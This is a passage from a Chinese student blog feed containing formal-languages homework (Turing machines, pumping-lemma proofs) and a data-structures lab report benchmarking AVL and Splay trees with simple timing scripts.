        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-8-2-2-c"><a href="#Ex-8-2-2-c" class="headerlink" title="Ex.8.2.2(c)"></a>Ex.8.2.2(c)</h3><p>​    一个满足条件的 $TM$ 为:<br><img src="/pic/45.png"></p><h3 id="Ex-8-2-3"><a href="#Ex-8-2-3" class="headerlink" title="Ex.8.2.3"></a>Ex.8.2.3</h3><p>​    $(a)$ 构造图灵机<br>​    $$M = \left({q_0, q_1, q_2, q_3, q_4, q_f}, {0, 1, {$}}, {0, 1, {$}, B}, \delta, q_0, B, {q_f}\right).$$<br>​    转移函数 $\delta$ 为:<br>$$<br>\begin{aligned}<br>\delta(q_0, $) &amp;= (q_1, $, R) \<br>\delta(q_1, 0) &amp;= (q_1, 0, R) \<br>\delta(q_1, 1) &amp;= (q_1, 1, R) \<br>\delta(q_1, B) &amp;= (q_2, B, L) \<br>\delta(q_2, 0) &amp;= (q_3, 1, L) \<br>\delta(q_2, 1) &amp;= (q_4, 0, L) \<br>\delta(q_3, 0) &amp;= (q_3, 0 , L) \<br>\delta(q_3, 1) &amp;= (q_3, 1 , L) \<br>\delta(q_3, $) &amp;= (q_f, $ , R) \<br>\delta(q_4, 0) &amp;= (q_3, 1 , L) \<br>\delta(q_4, 1) &amp;= (q_4, 0 , L) \<br>\delta(q_4, $) &amp;= (q_f, 1 , L)<br>\end{aligned}<br>$$<br>​    各状态的含义:</p><p>​    $q0$: 初态, 带头所扫描的符号必为 $$$;</p><p>​    $q1$: 右移状态, 当前带头所扫描的符号若为 $0$ 和 $1$ 则一直右移, 直至遇到空白带符为止；</p><p>​    $q2$: 处于二进制数的末位态, 带头所扫描的符号必为 $0$ 和 $1$, 否则无动作;</p><p>​    $q3$: 非进位左移状态, 当前带头所扫描的符号若为 $0$ 和 $1$ 则一直左移, 直至遇到 $$$为止;</p><p>​    $q4$: 进位左移状态, 带头扫描符号若为 $0$ 则将其变为 $1$, 并转 $q3$; 带头扫描符号若为 $1$ 则将其变为 $0$, 产生新的进位; 带头扫描符号若为 $$$, 产生一个新的进位.</p><p>​    $(b)$ 该 $TM$ 的 $ID$ 序列为:<br>$$<br>\begin{aligned}<br>q_0$111 &amp;\vdash $q_1111\vdash $1q_111\vdash $11q_11\vdash $111q_1B\vdash $11q_21 \<br>&amp;\vdash $1q_410\vdash $q_4100\vdash q_4$000\vdash q_fB1000\vdash q_f1000<br>\end{aligned}<br>$$</p><h3 id="Ex-8-2-5-b"><a href="#Ex-8-2-5-b" class="headerlink" title="Ex.8.2.5(b)"></a>Ex.8.2.5(b)</h3><p>​    这个图灵机接受的语言:<br>​    $$L(M) = L(0^<em>11^</em>).$$<br>​    即语言 $L(M)$ 中的串至少包含一个 $1$, 第一个 $1$ 之前只可能出现 $0$, 每个 $1$ 之后只可能跟随 $1$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BBST</title>
      <link href="/41/"/>
      <url>/41/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB3"><a href="#CST-LAB3" class="headerlink" title="CST LAB3"></a>CST LAB3</h1><h2 id="BBST"><a href="#BBST" class="headerlink" title="BBST"></a>BBST</h2><h3 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h3><p>我所实现的数据结构为 <code>AVLTree</code> 与 <code>SplayTree</code>, 现说明两个数据结构的核心接口与公共接口实现方法.</p><h4 id="1-AVLTree"><a href="#1-AVLTree" class="headerlink" title="1. AVLTree"></a>1. AVLTree</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">AvlNode</span> <span class="token punctuation">{</span>    AvlNode<span class="token operator">*</span> l<span class="token punctuation">;</span> <span class="token comment">// 左孩子.</span>    AvlNode<span class="token operator">*</span> r<span class="token punctuation">;</span> <span class="token comment">// 右孩子.</span>    <span class="token keyword">int</span> v<span class="token punctuation">;</span>      <span class="token comment">// 节点值.</span>    <span class="token keyword">int</span> h<span class="token punctuation">;</span>      <span class="token comment">// 节点高度.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">AvlTree</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> cnt<span class="token punctuation">;</span>       <span class="token comment">// 节点计数器.</span>    AvlNode<span class="token operator">*</span> Root<span class="token punctuation">;</span> <span class="token comment">// 根节点.</span>    AvlNode f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/Just-monika/solution-p3369">这篇文章</a>实现了 <code>AvlNode</code> 结构体, 并以数组形式给出 <code>AvlTree</code> 结构.</p><h5 id="1-1-Maintain"><a href="#1-1-Maintain" class="headerlink" title="1.1 Maintain()"></a>1.1 Maintain()</h5><p><code>Maintain(current)</code> 首先根据当前节点的平衡因子 <code>BanlanceFactor(current)</code> 判断是否需要调用 <code>LeftRotate()</code> 与 <code>RightRotate()</code> 接口进行左旋、右旋重构, 同时利用这两个接口实现了 <code>LeftAdjust()</code> 与 <code>RightAdjust()</code> 接口进行双旋重构.</p><h5 id="1-2-Insert-与-Remove"><a href="#1-2-Insert-与-Remove" class="headerlink" title="1.2 Insert() 与 Remove()"></a>1.2 Insert() 与 Remove()</h5><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 后首先通过 <code>PushUp(current)</code> 进行高度更新, 将当前节点高度更新为子节点的最大高度加 $1$.</p><p><code>AVLTree</code> 在 <code>Insert()</code> 与 <code>Remove()</code> 中 <code>PushUp(current)</code>后通过 <code>Maintain(current)</code> 进行重平衡.</p><h5 id="1-3-Search"><a href="#1-3-Search" class="headerlink" title="1.3 Search()"></a>1.3 Search()</h5><p><code>AVLTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>AvlNode* tmp</code> 记录数值不大于查询值的最大节点. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 节点.</p><h5 id="1-4-复杂度分析"><a href="#1-4-复杂度分析" class="headerlink" title="1.4 复杂度分析"></a>1.4 复杂度分析</h5><p>一高度为 $h$ 的 <code>AVLTree</code> 至少有 $S(h) = fib(h) = \varPhi^h$ 个节点, 故大小为 $n$ 的 <code>AVLTree</code> 的高度为 $O(\log n)$.</p><p>每次 <code>Search()</code> 操作的复杂度正相关于树高, 为 $O(\log n)$;</p><p>每次 <code>Insert()</code> 导致的失衡通过至多一次单旋或者双旋调整即可解决, 复杂度为 $O(1)$, 总复杂度取决于搜索高度, 为 $O(\log n)$;</p><p>每次 <code>Remove()</code> 导致的失衡可能从删除节点到根节点均需进行旋转调整, 旋转次数至多为 $O(\log n)$, 总体复杂度仍为 $O(\log n)$;</p><p>综上所述, <code>AVLTree</code> 的基本操作接口的时间复杂度均为 $O(\log n)$, 共计 $n$ 次操作, 总体时间复杂度为 $O(n\log n)$.</p><h4 id="2-SplayTree"><a href="#2-SplayTree" class="headerlink" title="2. SplayTree"></a>2. SplayTree</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">SplayNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 孩子.</span>    <span class="token keyword">int</span> father<span class="token punctuation">;</span> <span class="token comment">// 父亲.</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    <span class="token comment">// 节点值.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">SplayTree</span> <span class="token punctuation">{</span>    SplayNode t<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 节点数组.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考了<a href="https://www.luogu.com.cn/blog/cjyyb/solution-p3369">这篇文章</a>实现了 <code>SplayNode</code> 结构体, 并以数组形式给出 <code>SplayTree</code> 结构.</p><h5 id="2-1-Splay"><a href="#2-1-Splay" class="headerlink" title="2.1 Splay()"></a>2.1 Splay()</h5><p>首先实现了 <code>Rotate()</code> 接口进行单旋操作, 接着利用 <code>Rotate()</code> 接口实现了 <code>Splay()</code> 接口进行双旋操作.</p><h5 id="2-2-Insert"><a href="#2-2-Insert" class="headerlink" title="2.2 Insert()"></a>2.2 Insert()</h5><p><code>SplayTree</code> 在 <code>Insert()</code> 时逐层查询需要插入节点的位置, 直到到达叶节点. 插入节点后执行 <code>Splay(pointer, 0)</code> 将其伸展至根节点即可.</p><h5 id="2-3-Remove"><a href="#2-3-Remove" class="headerlink" title="2.3 Remove()"></a>2.3 Remove()</h5><p><code>SplayTree</code> 在 <code>Remove()</code> 中首先得到待删除节点的前驱与后继 <code>pred</code>与 <code>succ</code>. 因为预先插入了最小与最大节点, 这样的前驱与后继总是存在的. 通过 <code>Splay(pred, 0); Splay(succ, pred);</code> 将 <code>pred</code> 旋转至根节点, 并将 <code>succ</code> 旋转为其右孩子. 根据 <code>BBST</code> 的定义, 此时待删除节点必为 <code>succ</code> 的左孩子, 将其置零即可.</p><h5 id="2-4-Search"><a href="#2-4-Search" class="headerlink" title="2.4 Search()"></a>2.4 Search()</h5><p><code>SplayTree</code> 在 <code>Search()</code> 中依次判断查询值与当前节点值的大小关系, 若不相等则决定深入搜索左或右子树. 在搜索时使用 <code>int tmp</code> 记录数值不大于查询值的最大节点值. 若查询得到目标节点, 直接返回; 否则到达叶节点, 若节点值小于查询值, 根据查询方法必为数值小于查询值的最大节点, 直接返回; 若节点值大于查询值, 则返回 <code>tmp</code> 即可.</p><p>同时, <code>SplayTree</code> 对于搜索到的节点需要进行 <code>Splay()</code> 操作, 将其伸展至根节点.</p><h5 id="2-5-复杂度分析"><a href="#2-5-复杂度分析" class="headerlink" title="2.5 复杂度分析"></a>2.5 复杂度分析</h5><p>根据讲义 $P664-P668$ 对 <code>SplayTree</code> 的势能分析, 对于 <code>SplayTree</code> 的连续 $m\gg n$ 次 <code>Insert()</code>, <code>Remove()</code>, <code>Search()</code> 操作的均摊时间复杂度为 <code>O(logn)</code>.</p><h3 id="二、测例设计"><a href="#二、测例设计" class="headerlink" title="二、测例设计"></a>二、测例设计</h3><h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h4><p>操作系统: <code>Linux version 4.4.0-22621-Microsoft</code>.</p><p>编译器: <code>gcc version 5.4.0 (GCC)</code>.</p><h4 id="2-设计思路"><a href="#2-设计思路" class="headerlink" title="2. 设计思路"></a>2. 设计思路</h4><p>一共设计了四类测例, 存放在本地 <code>/Data</code> 路径中, 其相应生成器文件存放在本地 <code>/Generator</code> 路径中：</p><ul><li>第一类测例模拟完全随机进行插入、删除、查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_1.cpp</code>, 测例文件为 <code>01.in</code> ~ <code>03.in</code>.</li><li>第二类测例模拟先插入后删除操作, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行删除操作; 第二组 <code>60%</code> 次操作进行插入操作, <code>40%</code> 操作进行删除操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_2.cpp</code>, 测例文件为 <code>04.in</code> ~ <code>09.in</code>.</li><li>第三类测例模拟先插入后查找操作, 且查找范围为全局数值, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行全局查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行全局查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_3.cpp</code>, 测例文件为 <code>10.in</code> ~ <code>15.in</code>.</li><li>第四类测例模拟先插入后查找操作, 且查找范围为局部数值, 数值极差不超过总操作数的平方根, 分为两组进行, 第一组 <code>80%</code> 次操作进行插入操作, <code>20%</code> 次操作进行局部查找操作; 第二组 <code>20%</code> 次操作进行插入操作, <code>80%</code> 操作进行局部查找操作. 操作数分别为 <code>100</code>, <code>10000</code>, <code>1000000</code> 次. 对应生成器文件为 <code>generator_4.cpp</code>, 测例文件为 <code>16.in</code> ~ <code>21.in</code>.</li></ul><h4 id="3-测例生成"><a href="#3-测例生成" class="headerlink" title="3. 测例生成"></a>3. 测例生成</h4><p>使用 <code>bitmap</code> 数据结构记录 <code>Tree</code> 中数据的存在情况. 如果 <code>bitmap</code> 某一位设置为 <code>1</code>, 则相应值的节点存在于树中, 只能进行删除操作; 如果 <code>bitmap</code> 某一位设置为 <code>0</code>, 则相应值的节点不存在于树中, 只能进行插入操作。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// 随机数种子.srand((int)time(0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 充分保证了生成数据的随机性. 尝试生成一个 <code>Insert()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 0</code>, 则可以在该处进行插入操作, 否则随机查询下一个位置; 尝试生成一个 <code>Remove()</code> 数据点时, 随机访问一个位置, 若 <code>bitmap-&gt;test(rand_num) == 1</code>, 则可以在该处进行插入操作, 否则遍历查询其之后的位置, 直到找到一个可以删除的数据点; 尝试生成一个全局 <code>Search()</code> 数据点时, 随机访问一个位置即可; 尝试生成一个局部 <code>Search()</code> 数据点时, 首先随机访问一个位置, 并在一定范围内随机生成数据即可.</p><h4 id="4-测试脚本"><a href="#4-测试脚本" class="headerlink" title="4. 测试脚本"></a>4. 测试脚本</h4><p>编写了 <code>avl.sh</code> 脚本对 <code>AVLTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#avl.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> avl.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./avl <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> avl.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编写了 <code>splay.sh</code> 脚本对 <code>SplayTree</code> 数据结构进行测试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#splay.sh</span><span class="token comment">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">}</span><span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Test Case <span class="token variable">$i</span>:"</span> <span class="token operator">&gt;&gt;</span> splay.out    <span class="token punctuation">{</span> <span class="token function">time</span> ./splay <span class="token operator">&lt;</span>Data/<span class="token variable">$i</span>.in <span class="token operator">&gt;</span>Data/<span class="token variable">$i</span>.out<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&gt;</span> splay.out<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、性能分析"><a href="#三、性能分析" class="headerlink" title="三、性能分析"></a>三、性能分析</h3><h4 id="1-generator-1-cpp-数据"><a href="#1-generator-1-cpp-数据" class="headerlink" title="1. generator_1.cpp 数据"></a>1. <code>generator_1.cpp</code> 数据</h4><p>对应于 <code>01.in</code> ~ <code>03.in</code>.</p><table><thead><tr><th align="center">数据规模</th><th align="center">AVL</th><th align="center">Splay</th></tr></thead><tbody><tr><td align="center">1e2</td><td align="center">time:0.027s</td><td align="center">time:0.028s</td></tr><tr><td align="center">1e4</td><td align="center">time:0.026s</td><td align="center">time:0.153s</td></tr><tr><td align="center">1e6</td><td align="center">time:0.540s</td><td align="center">time:0.737s</td></tr></tbody></table><ul><li>在完全随机数据下, <code>AVLTree</code> 性能优于 <code>SplayTree</code>.</li><li>由于数据的随机性, <code>SplayTree</code> 数据访问的局部性差, 缓存策略效果不大, 其每次操作都需进行 $O(\log n)$ 次的旋转, 性能不如 <code>AVLTree</code>. 随着数据规模的增大, <code>AVLTree</code> 的性能优势逐渐扩大.</li></ul><h4 id="2-generator-2-cpp-数据"><a href="#2-generator-2-cpp-数据" class="headerlink" title="2. generator_2.cpp 数据"></a>2. <code>generator_2.cpp</code> 数据</h4><p>对应于 <code>04.in</code> ~ <code>09.in</code>.</p><table><thead><tr><th align="center">数据规模</th><th align="center">AVL</th><th align="center">Splay</th></tr></thead><tbody><tr><td align="center">1e2(8:2)</td><td align="center">time:0.022s</td><td align="center">time:0.015s</td></tr><tr><td align="center">1e2(6:4)</td><td align="center">time:0.021s</td><td align="center">time:0.015s</td></tr><tr><td align="center">1e4(8:2)</td><td align="center">time:0.026s</td><td align="center">time:0.023s</td></tr><tr><td align="center">1e4(6:4)</td><td align="center">time:0.025s</td><td align="center">time:0.020s</td></tr><tr><td align="center">1e6(8:2)</td><td align="center">time:1.455s</td><td align="center">time:1.730s</td></tr><tr><td align="center">1e6(6:4)</td><td align="center">time:1.273s</td><td align="center">time:2.057s</td></tr></tbody></table><ul><li>在先插入后删除数据下, 数据规模较小时 <code>SplayTree</code> 性能占优, 数据规模较大时 <code>AVLTree</code> 性能占优.</li><li>数据规模较小时, 两种数据结构插入与删除操作的效率相近, <code>SplayTree</code> 性能略占优; 数据规模较大时, <code>AVLTree</code> 相较 <code>SplayTree</code> 在删除操作的优势体现的更为明显.</li></ul><h4 id="3-generator-3-cpp-数据"><a href="#3-generator-3-cpp-数据" class="headerlink" title="3. generator_3.cpp 数据"></a>3. <code>generator_3.cpp</code> 数据</h4><p>对应于 <code>10.in</code> ~ <code>15.in</code>.</p><table><thead><tr><th align="center">数据规模</th><th align="center">AVL</th><th align="center">Splay</th></tr></thead><tbody><tr><td align="center">1e2(8:2)</td><td align="center">time:0.021s</td><td align="center">time:0.023s</td></tr><tr><td align="center">1e2(2:8)</td><td align="center">time:0.027s</td><td align="center">time:0.026s</td></tr><tr><td align="center">1e4(8:2)</td><td align="center">time:0.025s</td><td align="center">time:0.024s</td></tr><tr><td align="center">1e4(2:8)</td><td align="center">time:0.025s</td><td align="center">time:0.026s</td></tr><tr><td align="center">1e6(8:2)</td><td align="center">time:1.232s</td><td align="center">time:1.512s</td></tr><tr><td align="center">1e6(2:8)</td><td align="center">time:0.739s</td><td align="center">time:1.288s</td></tr></tbody></table><ul><li>在先插入后删除数据下, 数据规模较小时 <code>AVLTree</code> 性能略占优, 数据规模较大时 <code>AVLTree</code> 性能明显占优.</li><li>数据规模较小时, <code>AVLTree</code> 的性能略微优于 <code>SplayTree</code>. 随着数据规模的增大, 数据访问的局部性下降, <code>AVLTree</code> 和 <code>SplayTree</code> 性能均略微下降; 由于 <code>SplayTree</code> 每次操作都需进行 $O(\log n)$ 次的旋转, 受到的影响较大, 因此 <code>AVLTree</code> 性能明显占优.</li></ul><h4 id="4-generator-4-cpp-数据"><a href="#4-generator-4-cpp-数据" class="headerlink" title="4. generator_4.cpp 数据"></a>4. <code>generator_4.cpp</code> 数据</h4><p>对应于 <code>16.in</code> ~ <code>21.in</code>.</p><table><thead><tr><th align="center">数据规模</th><th align="center">AVL</th><th align="center">Splay</th></tr></thead><tbody><tr><td align="center">1e2(8:2)</td><td align="center">time:0.021s</td><td align="center">time:0.020s</td></tr><tr><td align="center">1e2(2:8)</td><td align="center">time:0.021s</td><td align="center">time:0.022s</td></tr><tr><td align="center">1e4(8:2)</td><td align="center">time:0.026s</td><td align="center">time:0.023s</td></tr><tr><td align="center">1e4(2:8)</td><td align="center">time:0.025s</td><td align="center">time:0.024s</td></tr><tr><td align="center">1e6(8:2)</td><td align="center">time:1.094s</td><td align="center">time:1.073s</td></tr><tr><td align="center">1e6(2:8)</td><td align="center">time:0.358s</td><td align="center">time:0.276s</td></tr></tbody></table><ul><li>在先插入后局部查找数据下, 数据规模较小时两种数据结构性能相近, 数据规模较大时 <code>SplayTree</code> 性能略占优.</li><li><code>SplayTree</code> 的理想优势在于数据访问的局部性, 在连续局部查找下, 搜索的数据越发集中, 随着数据规模的增大与查找操作比例的提高, <code>SplayTree</code> 的优势逐渐体现.</li></ul><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>在数据较为随机或无法确定数据局部性时, 应选用 <code>AVLTree</code>, 它的时间常数小, 单次时间复杂度较为稳定. 在数据访问的局部性较强时, 应选用 <code>SplayTree</code>, 可以实现较优的性能.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业10</title>
      <link href="/40/"/>
      <url>/40/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-7-2-1-b"><a href="#Ex-7-2-1-b" class="headerlink" title="Ex.7.2.1(b)"></a>Ex.7.2.1(b)</h3><p>​    对于任意的 $n \ge 1$, 存在 $z = a^nb^nc^n\in\left{a^nb^nc^i\mid i\le n\right}$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(a)$ 若 $vwx$ 不包含 $c$, 取 $k = 0$, </p><p>​    此时易知 $\vert uv^kwx^ky\vert = \vert uwy\vert &lt; 3n$, 且其中 $c$ 的数目为 $n$,</p><p>​    那么 $c$ 的数目至少多于 $a, b$ 中的一个, 即<br>​    $$uv^kwx^ky = uwy\notin\left{a^nb^nc^i\mid i\le n\right}.$$<br>​    $(b)$ 若 $vwx$ 包含 $c$, 那么必有 $x$ 包含 $c$. 取 $k = 2$, </p><p>​    由于 $\vert vwx\vert &lt; n$, 易知 $vwx$ 不包含 $a$,</p><p>​    此时 $uv^kwx^ky = uv^2wx^2y$, 且其中 $a$ 的数目为 $n$, $c$ 的数目 $&gt; n$,</p><p>​    那么 $c$ 的数目多于 $a$, 即<br>​    $$uv^kwx^ky = uv^2wx^2y\notin\left{a^nb^nc^i\mid i\le n\right}.$$</p><p>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.</p><h3 id="Ex-7-2-1-d"><a href="#Ex-7-2-1-d" class="headerlink" title="Ex.7.2.1(d)"></a>Ex.7.2.1(d)</h3><p>​    对于任意的 $n \ge 1$, 存在 $z = 0^n1^{n^2}\in\left{0^i1^j\mid j = i^2\right}$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(A)$ 若 $vwx$ 仅包含 $0$, 取 $k = 0$, </p><p>​    此时 $uv^kwx^ky = uwy$, 其中 $0$ 的数目 $&lt; n$, $1$ 的数目为 $n^2$, 即<br>​    $$uv^kwx^ky = uwy\notin\left{0^i1^j\mid j = i^2\right}.$$<br>​    $(B)$ 若 $vwx$ 仅包含 $1$, 取 $k = 0$, </p><p>​    此时 $uv^kwx^ky = uwy$, 其中 $1$ 的数目 $&lt; n^2$, $0$ 的数目为 $n$, 即<br>​    $$uv^kwx^ky = uwy\notin\left{0^i1^j\mid j = i^2\right}.$$<br>​    $(C)$ 若 $vwx$ 同时包含 $0$ 和 $1$:</p><p>​    $(c.1)$ 若 $v$ 同时包含 $0$ 和 $1$, 取 $k = 2$, </p><p>​    不妨设<br>​    $$v = 0^p1^q, x = 1^r,$$<br>​    其中<br>​    $$p\ge 1, q\ge 1, p + q + r &lt; n.$$<br>​    此时<br>​    $$uv^kwx^ky = uv^2wx^2y = 0^{n + p}1^{n^2 + q + r},$$<br>​    其中<br>​    $$(n + p)^2 &gt; n^2 + 2np &gt; n^2 + n &gt; n^2 + q + r,$$<br>​    故有<br>​    $$uv^kwx^ky = uv^2wx^2y\notin\left{0^i1^j\mid j = i^2\right}.$$<br>​    $(c.2)$ 若 $v$ 仅包含 $0$, 取 $k = 2$, </p><p>​    不妨设<br>​    $$v = 0^p, x = 0^q1^r,$$<br>​    其中<br>​    $$p\ge 1, p + q + r &lt; n.$$<br>​    此时<br>​    $$uv^kwx^ky = uv^2wx^2y = 0^{n + p + q}1^{n^2 + r},$$<br>​    其中<br>​    $$(n + p + q)^2 &gt; n^2 + 2np &gt; n^2 + n &gt; n^2 + r,$$<br>​    故有<br>​    $$uv^kwx^ky = uv^2wx^2y\notin\left{0^i1^j\mid j = i^2\right}.$$<br>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.    </p><h3 id="Ex-7-3-1-b"><a href="#Ex-7-3-1-b" class="headerlink" title="Ex.7.3.1(b)"></a>Ex.7.3.1(b)</h3><p>​    考虑上下文无关语言 $L$ 的一个 $CNF$ 文法 $G = (V, T, P, S)$. </p><p>​    我们构造 $G’ = (V’, T, P’, S)$.</p><p>​    其中 $\forall\thinspace A\in V$, 我们令 $A\in V’, \thinspace A’\in V’$.</p><p>​    $\circ$ 若 $A\rightarrow BC\in P$, 我们令 $A\rightarrow BC\in P’, \thinspace A’\rightarrow BC’\in P’$.</p><p>​    $\circ$ 若 $A\rightarrow b\in P$, 我们令 $A\rightarrow b\in P’$.</p><p>​    若 $b\ne a$, 再令 $A’\rightarrow b\in P’$; 若 $b = a$, 则令 $A’\rightarrow\varepsilon\in P’$.</p><p>​    如此得到了一个文法 $G’$, $L/a = L(G’)$ 为上下文无关语言.</p><p>​    也即 $CFL$ 对 $L/a$ 运算封闭.</p><h3 id="Ex-7-3-2"><a href="#Ex-7-3-2" class="headerlink" title="Ex.7.3.2"></a>Ex.7.3.2</h3><p>​    $(a)$</p><p>​    满足 $L_1$ 的一个可行的上下文无关文法 $G_1$ 是:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow AB \<br>A &amp;\rightarrow aAbb \mid \varepsilon \<br>B &amp;\rightarrow cB \mid \varepsilon<br>\end{aligned}<br>$$<br>​    满足 $L_2$ 的一个可行的上下文无关文法 $G_2$ 是:<br>$$<br>\begin{aligned}<br>S &amp;\rightarrow AB \<br>A &amp;\rightarrow aA \mid \varepsilon \<br>B &amp;\rightarrow bBcc \mid \varepsilon<br>\end{aligned}<br>$$<br>​    易知 $L_1 = L(G_1)$, $L_2 = L(G_2)$.</p><p>​    $(b)$ 记<br>​    $$L = L_1\cap L_2 = \left{a^nb^{2n}c^{4n}\mid n\ge 0\right}.$$<br>​    $L$ 不是 $CFG$, 使用 $Pumping$ 引理证明之.</p><p>​    对于任意的 $n \ge 1$, 存在 $z = a^nb^{2n}c^{4n}\in L$.</p><p>​    考虑任意 $u, v, w, x, y$ 满足 $z = uvwxy$, $\vert vwx\vert &lt; n$, 且 $vx\ne\varepsilon$.</p><p>​    $(a)$ 若 $vwx$ 不包含 $c$, 取 $k = 0$, </p><p>​    此时易知 $\vert uv^kwx^ky\vert = \vert uwy\vert &lt; 7n$, 且其中 $c$ 的数目为 $4n$,</p><p>​    那么 $c$ 的数目要么多于 $a$ 的 $4$ 倍, 要么多于 $b$ 的 $2$ 倍, 即<br>​    $$uv^kwx^ky = uwy\notin L.$$<br>​    $(b)$ 若 $vwx$ 包含 $c$, 那么必有 $x$ 包含 $c$. 取 $k = 2$, </p><p>​    由于 $\vert vwx\vert &lt; n$, 易知 $vwx$ 不包含 $a$,</p><p>​    此时 $uv^kwx^ky = uv^2wx^2y$, 且其中 $a$ 的数目为 $n$, $c$ 的数目 $&gt; 4n$, 即<br>​    $$uv^kwx^ky = uv^2wx^2y\notin L.$$<br>​    综上所述, $z$ 不满足 $CFL$ 的 $Pumping$ 引理, 不是上下文无关语言.</p><h3 id="Ex-7-3-6"><a href="#Ex-7-3-6" class="headerlink" title="Ex.7.3.6"></a>Ex.7.3.6</h3><p>​    作 $L = L(G)$, $G = (V, T, P, S)$. 构造 $G^R = (V, T, P^R, S)$.</p><p>​    其中 $P^R$ 的产生式是 $P$ 中的产生式的反向, 即<br>​    $$A\rightarrow \alpha^R\in P^R\Leftrightarrow A\rightarrow\alpha\in P.$$</p><p>​    下证:<br>​    $$\forall\thinspace w\in T^*, S\mathop{\Longrightarrow}\limits_G^* w\Longleftrightarrow S\mathop{\Longrightarrow}\limits_{G_R}^* 